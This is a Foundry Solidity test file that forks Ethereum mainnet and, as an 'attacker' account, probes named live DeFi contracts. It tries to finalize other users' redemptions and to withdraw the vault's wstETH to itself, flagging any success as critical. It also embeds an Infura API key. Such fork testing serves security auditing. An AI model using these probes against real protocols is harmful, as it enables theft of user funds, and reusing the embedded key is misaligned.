// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IRedemption {
    function IAU() external view returns (address);
    function REDEMPTION_CONTROLLER() external view returns (address);
    function TASSET() external view returns (address);
    function VAULT() external view returns (address);
    function owner() external view returns (address);
    function paused() external view returns (bool);
    function redeem(uint96 amount) external;
    function finalizeRedeem(uint256 index) external;
    function getPendingRedeems(address user) external view returns (uint256[] memory);
    function getRedeemInfo(address user, uint256 index) external view returns (uint96, uint64, bool);
    function getRedeemLength(address user) external view returns (uint256);
    function minRedeemInUnderlying() external view returns (uint96);
    function waitingPeriod() external view returns (uint32);
    function redemptionFee() external view returns (uint32);
    function totalRedeeming() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IVault {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
}

contract RedemptionMechanismExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRedemptionMechanism() public view {
        console.log("=== REDEMPTION MECHANISM ANALYSIS ===\n");

        IRedemption r = IRedemption(REDEMPTION_0);

        console.log("Redemption 0:", REDEMPTION_0);
        console.log("IAU:", r.IAU());
        console.log("TASSET:", r.TASSET());
        console.log("VAULT:", r.VAULT());
        console.log("REDEMPTION_CONTROLLER:", r.REDEMPTION_CONTROLLER());
        console.log("Owner:", r.owner());
        console.log("Paused:", r.paused());
        console.log("Waiting period:", r.waitingPeriod());
        console.log("Min redeem:", r.minRedeemInUnderlying());
        console.log("Redemption fee:", r.redemptionFee());
        console.log("Total redeeming:", r.totalRedeeming());

        // Check if Vault is ERC4626
        (bool success, bytes memory data) = VAULT.staticcall(
            abi.encodeWithSignature("asset()")
        );
        if (success && data.length == 32) {
            address asset = abi.decode(data, (address));
            console.log("\nVault asset:", asset);
        }

        (success, data) = VAULT.staticcall(
            abi.encodeWithSignature("totalAssets()")
        );
        if (success && data.length == 32) {
            uint256 total = abi.decode(data, (uint256));
            console.log("Vault totalAssets:", total / 1e18);
        }
    }

    function test_CheckRedemptionApprovals() public view {
        console.log("=== REDEMPTION APPROVALS ===\n");

        // Check what Redemption 0 has approved
        address[] memory spenders = new address[](5);
        spenders[0] = VAULT;
        spenders[1] = STRATEGY_0;
        spenders[2] = IRedemption(REDEMPTION_0).IAU();
        spenders[3] = IRedemption(REDEMPTION_0).TASSET();
        spenders[4] = IRedemption(REDEMPTION_0).REDEMPTION_CONTROLLER();

        console.log("Checking Redemption 0 wstETH approvals:");
        for (uint i = 0; i < spenders.length; i++) {
            if (spenders[i] == address(0)) continue;
            uint256 allowance = IERC20(wstETH).allowance(REDEMPTION_0, spenders[i]);
            if (allowance > 0) {
                console.log("  Approved:", spenders[i]);
                console.log("  Allowance:", allowance);
            }
        }

        // Check Vault approvals to Redemption
        console.log("\nVault wstETH approval to Redemption 0:");
        uint256 approval = IERC20(wstETH).allowance(VAULT, REDEMPTION_0);
        console.log("  ", approval);
    }

    function test_TryInitiateRedeem() public {
        console.log("=== TRYING INITIATE REDEEM ===\n");

        IRedemption r = IRedemption(REDEMPTION_0);

        // To redeem, user needs IAU tokens
        address iau = r.IAU();
        console.log("IAU token:", iau);

        uint256 minRedeem = r.minRedeemInUnderlying();
        console.log("Min redeem:", minRedeem);

        vm.startPrank(attacker);

        // Try calling redeem (should fail - no IAU tokens)
        console.log("\nTrying redeem(1e18)...");
        try r.redeem(uint96(1e18)) {
            console.log("Redeem initiated!");
        } catch Error(string memory reason) {
            console.log("Redeem failed:", reason);
        } catch (bytes memory data) {
            console.log("Redeem failed (raw):");
            if (data.length > 0 && data.length < 100) {
                console.logBytes(data);
            }
        }

        vm.stopPrank();
    }

    function test_CheckFinalizeRedeemAccess() public {
        console.log("=== CHECKING FINALIZE REDEEM ACCESS ===\n");

        IRedemption r = IRedemption(REDEMPTION_0);

        // Check if there are any pending redeems we could finalize
        // for other users

        vm.startPrank(attacker);

        // Try finalizing index 0 (might be someone else's redeem)
        console.log("Trying finalizeRedeem(0)...");
        try r.finalizeRedeem(0) {
            console.log("CRITICAL: Finalized someone's redeem!");
        } catch Error(string memory reason) {
            console.log("FinalizeRedeem failed:", reason);
        } catch (bytes memory data) {
            console.log("FinalizeRedeem failed (raw):");
            if (data.length > 0 && data.length < 100) {
                console.logBytes(data);
            }
        }

        vm.stopPrank();
    }

    function test_ExploitViaStrategyDelegatecall() public {
        console.log("=== EXPLOIT VIA STRATEGY DELEGATECALL ===\n");

        // If Strategy delegatecalls to an action that calls Redemption.finalizeRedeem()
        // the call would come from Strategy's address with Strategy's context

        // But we need to:
        // 1. Make Strategy have a pending redeem
        // 2. Make Strategy call finalizeRedeem

        // Let's check if Strategy has any pending redeems
        IRedemption r = IRedemption(REDEMPTION_0);

        uint256 pendingCount = r.getRedeemLength(STRATEGY_0);
        console.log("Strategy 0 pending redeems:", pendingCount);

        if (pendingCount > 0) {
            for (uint i = 0; i < pendingCount; i++) {
                (uint96 amount, uint64 timestamp, bool finalized) = r.getRedeemInfo(STRATEGY_0, i);
                console.log("  Redeem", i, ":");
                console.log("    Amount:", amount);
                console.log("    Timestamp:", timestamp);
                console.log("    Finalized:", finalized);
            }
        }

        // Check if Vault has pending redeems
        pendingCount = r.getRedeemLength(VAULT);
        console.log("\nVault pending redeems:", pendingCount);
    }

    function test_AnalyzeVaultWithdraw() public {
        console.log("=== VAULT WITHDRAW ANALYSIS ===\n");

        // Check if Vault's withdraw can be called by anyone
        // ERC4626 withdraw: withdraw(assets, receiver, owner)

        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18);

        vm.startPrank(attacker);

        // Try ERC4626 withdraw with attacker as receiver
        console.log("\nTrying Vault.withdraw(1e18, attacker, VAULT)...");
        try IVault(VAULT).withdraw(1e18, attacker, VAULT) returns (uint256 shares) {
            console.log("CRITICAL: Withdraw succeeded! Shares burned:", shares);
        } catch Error(string memory reason) {
            console.log("Withdraw failed:", reason);
        } catch (bytes memory data) {
            console.log("Withdraw failed (raw):");
            if (data.length > 0 && data.length < 100) {
                console.logBytes(data);
            }
        }

        // Try ERC4626 redeem
        console.log("\nTrying Vault.redeem(1e18, attacker, VAULT)...");
        try IVault(VAULT).redeem(1e18, attacker, VAULT) returns (uint256 assets) {
            console.log("CRITICAL: Redeem succeeded! Assets:", assets);
        } catch Error(string memory reason) {
            console.log("Redeem failed:", reason);
        } catch (bytes memory data) {
            console.log("Redeem failed (raw):");
            if (data.length > 0 && data.length < 100) {
                console.logBytes(data);
            }
        }

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);

        console.log("\nResults:");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Attacker wstETH:", attackerBalance / 1e18);

        vm.stopPrank();
    }

    function test_FullSystemMapping() public view {
        console.log("=== FULL SYSTEM MAPPING ===\n");

        console.log("TOKENS:");
        console.log("  wstETH:", wstETH);
        console.log("  aWstETH: 0x0B925eD163218f6662a35e0f0371Ac234f9E9371");
        console.log("  IAU:", IRedemption(REDEMPTION_0).IAU());
        console.log("  TASSET:", IRedemption(REDEMPTION_0).TASSET());

        console.log("\nCONTRACTS:");
        console.log("  Vault:", VAULT);
        console.log("  Strategy 0:", STRATEGY_0);
        console.log("  Redemption 0:", REDEMPTION_0);
        console.log("  Redemption 1:", REDEMPTION_1);
        console.log("  RedemptionController: 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510");
        console.log("  ActionExecutor: 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94");
        console.log("  StrategyExecutor: 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e");

        console.log("\nBALANCES:");
        console.log("  Vault wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);
        console.log("  Strategy 0 aWstETH:", IERC20(0x0B925eD163218f6662a35e0f0371Ac234f9E9371).balanceOf(STRATEGY_0) / 1e18);

        console.log("\nAPPROVALS:");
        console.log("  Vault->RedemptionController:", IERC20(wstETH).allowance(VAULT, 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510));
    }
}
